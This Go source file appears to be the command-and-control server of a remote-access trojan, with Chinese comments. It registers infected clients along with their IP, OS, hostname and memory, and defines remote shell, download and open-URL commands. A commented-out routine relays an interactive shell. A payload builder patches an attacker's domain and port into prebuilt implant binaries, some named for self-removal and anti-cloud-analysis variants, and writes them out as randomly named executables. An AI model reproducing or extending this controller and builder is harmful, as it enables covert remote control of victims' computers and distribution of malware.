package main

import (
	"bytes"
	"fmt"
	"github.com/fananchong/cstruct-go"
	uuid "github.com/satori/go.uuid"
	"io/ioutil"
	"math/rand"
	"net"
	"path/filepath"
	"strings"
	"time"
	"unsafe"
)

const SERVER_HEARTS = 0
const SERVER_RESET = 1
const SERVER_SHELL = 2
const SERVER_SHELL_CHANNEL = 3
const SERVER_DOWNLOAD = 4
const SERVER_OPENURL = 8
const SERVER_SYSTEMINFO = 10
const SERVER_SHELL_ERROR = 12
const SERVER_LOGIN       = 14

type MSG struct {
	sign [10]byte
	mod  uint16
	l    uint32
}

func listen(port string) {
	defer func() {
		tcpConn = false // TCP功能下线了
	}()
	fmt.Println("Starting the server ...")
	// 创建 listener
	listener, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println("Error listening", err.Error())
		return //终止程序
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting", err.Error())
			return // 终止程序
		}
		go doServerStuff(conn)
		tcpConn = true
	}
}

// 心跳包线程池和解决首次接入
func doServerStuff(conn net.Conn) {
	defer func() {
		fmt.Println(conn.RemoteAddr().String(),"....awsl!")
	}()
	for {
		if _, ok := serverMap[conn]; !ok {
			//第一次上线
			buf := make([]byte, unsafe.Sizeof(MSG{}))
			l, err := conn.Read(buf)
			if err != nil {
				fmt.Println("Error reading Code:", l, err.Error())
				return
			}
			var msg = *(**MSG)(unsafe.Pointer(&buf))

			if string(msg.sign[:]) == sign {
				if msg.l != 0 && msg.mod == SERVER_SYSTEMINFO {
					buf := make([]byte, msg.l)
					l, err := conn.Read(buf)
					if err != nil {
						fmt.Println("Error reading in inline read:", l, err.Error())
						_ = conn.Close() // 第一次接收就GG了，完全没必要再鸟他了
						return
					}
					sp := strings.Split(string(buf[:]), "\n")
					u1, _ := uuid.NewV4()
					if len(sp) == 5 {
						newS := S{
							uuid:        u1.String(),
							memory:      sp[2],
							OS:          sp[1],
							ip:          sp[0],
							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
							hostName:    sp[3],
							shellInChan: make(chan string),
						}
						serverMap[conn] = &newS
					} else {
						// // 获取到了信息包，但是完全不知道这是啥
						newS := S{
							uuid:        u1.String(),
							memory:      "unknown",
							OS:          "unknown",
							ip:          "unknown",
							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
							hostName:    "unknown",
							shellInChan: make(chan string),
						}
						serverMap[conn] = &newS
					}
					onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS,serverMap[conn].hostName)
					fmt.Println(onlineMsg)
					Broadcast(onlineMsg)

				}else{
					//第一次上线就直接给心跳包而不发system信息完全不知道他是谁的
					//砸门就手动构造一个问问他是谁
					cMsg:=tlLoadMsg(SERVER_SYSTEMINFO,0)
					bMsg, _ := cstruct.Marshal(&cMsg)
					l, err := conn.Write(bMsg)
					if err != nil || l == 0 {
						fmt.Println("Error reading in inline read:", l, err.Error())
						_ = conn.Close() // 第一次接收就GG了，完全没必要再鸟他了
						return
					}
					//再给你一次机会
					buf := make([]byte, unsafe.Sizeof(MSG{}))
					l, err = conn.Read(buf)
					if err != nil {
						fmt.Println("Error reading Code:", l, err.Error())
						return
					}
					var msg = *(**MSG)(unsafe.Pointer(&buf))
					fmt.Println(string(msg.sign[:]))
					if string(msg.sign[:]) == sign {
						if msg.l != 0 && msg.mod == SERVER_SYSTEMINFO { // 是第一次登陆带有系统信息的包
							buf := make([]byte, msg.l)
							l, err := conn.Read(buf)
							if err != nil {
								fmt.Println("Error reading in inline read:", l, err.Error())
								_ = conn.Close() // 第一次接收就GG了，完全没必要再鸟他了
								return
							}
							sp := strings.Split(string(buf[:]), "\n")
							u1, _ := uuid.NewV4()
							if len(sp) == 4 {
								newS := S{
									uuid:        u1.String(),
									memory:      sp[2],
									OS:          sp[1],
									ip:          sp[0],
									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
									hostName:    sp[3],
									shellInChan: make(chan string),
								}
								serverMap[conn] = &newS
							} else {
								// 获取到了信息包，但是完全不知道这是啥
								newS := S{
									uuid:        u1.String(),
									memory:      "unknown",
									OS:          "unknown",
									ip:          "unknown",
									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
									hostName:    "unknown",
									shellInChan: make(chan string),
								}
								serverMap[conn] = &newS
							}
							onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS,serverMap[conn].hostName)
							Broadcast(onlineMsg)
						}
					}
				}
			}
			Handle(conn,SERVER_LOGIN)
		} else {
			buf := make([]byte, unsafe.Sizeof(MSG{}))
			l, err := conn.Read(buf)
			if err != nil {
				fmt.Println("Error reading Code:", l, err.Error())
				_ = conn.Close()
				offlineMsg := fmt.Sprintf("remove|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp)
				Broadcast(offlineMsg)
				delete(serverMap, conn) //因为这个不是第一次，所以conn肯定会在表里，得删除
				return
			}
			var msg = *(**MSG)(unsafe.Pointer(&buf))
			switch msg.mod {

			case SERVER_HEARTS:
				Handle(conn, SERVER_HEARTS)
			}

		}

	}
}
func tlLoadFlag(str string,l int)[]byte{
	var Flag []byte
	bStr := []byte(str)
	for i:=0;i<l;i++{

		if i >= len(bStr){
			Flag = append(Flag, byte(0))
		}else{
			Flag = append(Flag,bStr[i])
		}
	}
	return Flag
}
func tlLoadPath(str string)[255]byte{
	var Path [255]byte
	bStr := []byte(str)
	for i:=0;i<255;i++{
		if i>=len(bStr){
			Path[i] = byte(0)
		}else{
			Path[i] = bStr[i]
		}
	}
	return Path
}

func tlLoadMsg(code int, l int) MSG {
	var lSign [10]byte
	bSign := []byte(sign)
	for i := 0; i < 10; i++ {
		if i >= len(bSign) {
			lSign[i] = byte(0)
		} else {
			lSign[i] = bSign[i]
		}

	}
	msg := MSG{
		sign: lSign,
		mod:  uint16(code),
		l:    uint32(l),
	}
	return msg
}
func tlShellHandle(conn net.Conn){
/*
	s := serverMap[conn]
	go func() {
		for {
			buf := make([]byte, unsafe.Sizeof(MSG{}))
			l, err := conn.Read(buf)
			var h = *(**MSG)(unsafe.Pointer(&buf))
			if err != nil || l == 0 {
				return
			}
			switch h.mod {
			case SERVER_SHELL_CHANNEL:
				shell := make([]byte, h.l)
				l, err := conn.Read(shell)
				if err != nil || l == 0 {

					return
				}
				dec := mahonia.NewDecoder("GBK")
				decShell:=dec.ConvertString(string(shell))
				encodeString := base64.StdEncoding.EncodeToString([]byte(decShell))
				msg := fmt.Sprintf("out|%s|%s", s.uuid, encodeString)
				Broadcast(msg)
			case SERVER_SHELL_ERROR:
				Handle(conn,SERVER_HEARTS)
				return
			case SERVER_RESET:
				Handle(conn,SERVER_HEARTS)
				return
			}
		}
	}()
	for {

		shell, _ := <-s.shellInChan
		if shell == "reset\n" {
			msg := tlLoadMsg(SERVER_RESET, 0)
			bMsg, _ := cstruct.Marshal(&msg)
			l, err := conn.Write(bMsg)
			if err != nil || l == 0 {
				fmt.Println("Send Head Error", err.Error())
				return
			}
			fmt.Println("Shell Handle exit.")
			return
		}
		msg := tlLoadMsg(SERVER_SHELL_CHANNEL, len(shell))
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			fmt.Println("Send Head Error", err.Error())
			return
		}
		l, err = conn.Write([]byte(shell))
		fmt.Println("send:", shell)
		if err != nil || l == 0 {
			fmt.Println("Send Error", err.Error())
			return
		}

	}
*/
}
// 主动接管
func Handle(conn net.Conn, code int) {
	switch code {
	case SERVER_HEARTS:
		fmt.Println("Recv Hearts Packet.")
		return
	case SERVER_SHELL:
		msg := tlLoadMsg(SERVER_SHELL, 0)
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			return
		}
		go tlShellHandle(conn)
	case SERVER_LOGIN:
		msg := tlLoadMsg(SERVER_LOGIN, len([]byte(Pass)))
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			return
		}
		l, err = conn.Write([]byte(Pass))
		if err != nil || l == 0 {
			return
		}
		return
	}
}
func FunctionDownload(conn net.Conn,http string,path string,execute uint16){//一次性发包用

}

func Generate(domain string,port string,version int)string  {
	// version 0是普通 1 是仅运行
	fmt.Println(domain,port,version)
	var path string
	const ipFlag = "1111111111111111111111111111111111111111111111111"
	const portFlag = "2222"

	if len(domain) > len(ipFlag){
		return ""
	}
	bDomain := tlLoadFlag(domain,len(ipFlag))

	if len(port)>len(portFlag){
		return ""
	}
	bPort := tlLoadFlag(port,len(portFlag))
	if version==0{
		//path = "Server\\default.dat"
		path = filepath.Join("Server","default.dat")
	}else if version == 1{
		//path = "Server\\justRun.dat"
		path = filepath.Join("Server","justRun.dat")
	}else if version == 2{
		//path = "Server\\autoRemove.dat"
		path = filepath.Join("Server","autoRemove.dat")
	}else if version == 3{
		//path = "Server\\antiCloud.dat"
		path = filepath.Join("Server","antiCloud.dat")
	}else if version == 4{
		//path = "Server\\fill.dat"
		path = filepath.Join("Server","full.dat")
	}
	fmt.Println("D:",len(bDomain),"P:",len(bPort),len(ipFlag),len(portFlag))
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return ""
	}
	b = bytes.Replace(b,[]byte(ipFlag),bDomain,len(bDomain))
	b = bytes.Replace(b,[]byte(portFlag),bPort,len(bPort))
	rand.Seed(time.Now().UnixNano())
	Name:= tlRandStringRunes(4)+".exe"
	err = ioutil.WriteFile(filepath.Join("TEMP",Name), b, 0777)
	if err != nil{
		return ""
	}
	return Name

}